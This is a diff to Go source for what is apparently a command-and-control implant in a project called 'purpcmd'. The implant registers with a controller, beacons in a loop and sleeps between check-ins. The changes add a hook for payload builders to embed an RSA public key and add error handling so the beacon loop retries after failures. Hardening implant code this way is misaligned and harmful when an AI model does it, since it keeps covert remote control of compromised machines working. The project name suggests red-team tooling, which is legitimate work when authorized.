@@ -5,11 +5,20 @@ import (
 	"encoding/base64"
 	"fmt"
 	"io"
+	"time"
+
 	"purpcmd/implant/ssh"
 	"purpcmd/internal"
 	"purpcmd/internal/encrypt"
-	"time"
 )
+
+// SetPublicKeyDER configures the RSA public key embedded by a payload builder.
+// Keeping this entry point in the public core package allows generated sources
+// outside the repository, such as /tmp build workspaces, to respect Go's
+// internal-package import rules.
+func SetPublicKeyDER(der []byte) error {
+	return encrypt.SetGlobalPublicKeyDER(der)
+}
 
 func Start(sock string, payloadTypes ...string) {
 	i := ImplantInit(payloadTypes...)
@@ -32,7 +41,10 @@ func Start(sock string, payloadTypes ...string) {
 
 	p := base64.StdEncoding.EncodeToString(aux)
 	println(p)
-	h.PostRegistering([]byte(p))
+	if err := h.PostRegistering([]byte(p)); err != nil {
+		println(err.Error())
+		return
+	}
 
 	for {
 		data := PackCheck(i)
@@ -45,9 +57,17 @@ func Start(sock string, payloadTypes ...string) {
 		resp, err := h.Get([]byte(dataP))
 		if err != nil {
 			println(err.Error())
+			time.Sleep(time.Duration(i.Sleep) * time.Second)
+			continue
 		}
 
-		xyz, _ := io.ReadAll(resp)
+		xyz, readErr := io.ReadAll(resp)
+		_ = resp.Close()
+		if readErr != nil {
+			println(readErr.Error())
+			time.Sleep(time.Duration(i.Sleep) * time.Second)
+			continue
+		}
 		fmt.Println("Data received ", len(xyz))
 		if len(xyz) < 16 {
 			time.Sleep(time.Duration(i.Sleep) * time.Second)
